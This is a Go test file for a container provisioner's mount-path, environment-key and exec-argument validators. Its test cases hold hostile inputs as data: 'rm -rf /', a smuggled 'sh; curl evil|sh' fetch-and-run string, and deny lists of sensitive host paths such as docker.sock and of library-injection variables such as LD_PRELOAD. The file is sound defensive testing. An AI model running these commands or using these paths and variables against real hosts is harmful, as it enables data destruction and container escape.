package provisioner

import "testing"

func TestMountPathAllowed(t *testing.T) {
	// Critical test: mountPathAllowed must reject child paths of forbidden
	// directories, not just exact matches. This was the runtime-found bug:
	// /var/run/docker.sock used to slip through because /var/run was an
	// exact-match-only entry.
	cases := []struct {
		path    string
		allowed bool
	}{
		// Allowed
		{"/data", true},
		{"/home/user", true},
		{"/workspace", true},
		{"/tmp/work", true},

		// Exact-match disallowed
		{"/", false},
		{"/etc", false},
		{"/proc", false},
		{"/sys", false},
		{"/dev", false},
		{"/var", false},
		{"/var/run", false},

		// Child paths of disallowed dirs (the bug we fixed)
		{"/etc/passwd", false},
		{"/var/run/docker.sock", false},
		{"/var/lib/kubelet", false},
		{"/usr/bin/sh", false},
		{"/proc/self", false},
		{"/sys/fs/cgroup", false},
		{"/dev/sda1", false},
		{"/lib/x86_64-linux-gnu", false},

		// Edge cases
		{"", false},
		{"/etc/", false}, // trailing slash on a forbidden exact match
		// Names that *contain* a forbidden path as substring but aren't a child:
		{"/etcetera", true},          // not /etc nor child of /etc
		{"/data/var/secrets", true},  // /var only forbidden at root
	}

	for _, tc := range cases {
		got := mountPathAllowed(tc.path)
		if got != tc.allowed {
			t.Errorf("mountPathAllowed(%q) = %v, want %v", tc.path, got, tc.allowed)
		}
	}
}

func TestEnvKeyAllowed(t *testing.T) {
	cases := []struct {
		key     string
		allowed bool
	}{
		// Allowed
		{"USER", true},
		{"HOME", true},
		{"DISPLAY", true},
		{"VNC_PW", true},
		{"MY_APP_CONFIG", true},

		// Disallowed
		{"LD_PRELOAD", false},
		{"LD_LIBRARY_PATH", false},
		{"DYLD_INSERT_LIBRARIES", false},
		{"PYTHONSTARTUP", false},
		{"PYTHONPATH", false},
		{"NODE_OPTIONS", false},
		{"PERL5OPT", false},
		{"PERL5LIB", false},
		{"RUBYOPT", false},
		{"PATH", false},
	}
	for _, tc := range cases {
		got := envKeyAllowed(tc.key)
		if got != tc.allowed {
			t.Errorf("envKeyAllowed(%q) = %v, want %v", tc.key, got, tc.allowed)
		}
	}
}

func TestParseExecArgv(t *testing.T) {
	cases := []struct {
		name string
		cfg  map[string]interface{}
		want []string
	}{
		{
			"valid argv",
			map[string]interface{}{"argv": []interface{}{"sh", "-lc", "echo hi"}},
			[]string{"sh", "-lc", "echo hi"},
		},
		{
			"legacy cmd:string is REJECTED (no shell injection allowed)",
			map[string]interface{}{"cmd": "rm -rf /"},
			nil,
		},
		{
			"empty argv",
			map[string]interface{}{"argv": []interface{}{}},
			nil,
		},
		{
			"argv with empty first element",
			map[string]interface{}{"argv": []interface{}{"", "x"}},
			nil,
		},
		{
			"argv[0] with shell metacharacters → reject",
			map[string]interface{}{"argv": []interface{}{"sh; curl evil|sh", "x"}},
			nil,
		},
		{
			"non-string element in argv → reject",
			map[string]interface{}{"argv": []interface{}{"sh", 42}},
			nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := parseExecArgv(tc.cfg)
			if !sliceEqual(got, tc.want) {
				t.Errorf("got %v, want %v", got, tc.want)
			}
		})
	}
}

func sliceEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func TestGenerateVNCPassword(t *testing.T) {
	// Should be unique each call and >= 16 chars.
	a, err := generateVNCPassword()
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	b, err := generateVNCPassword()
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if a == b {
		t.Fatal("two calls returned the same password — RNG broken")
	}
	if len(a) < 16 {
		t.Fatalf("password too short: %d chars", len(a))
	}
}
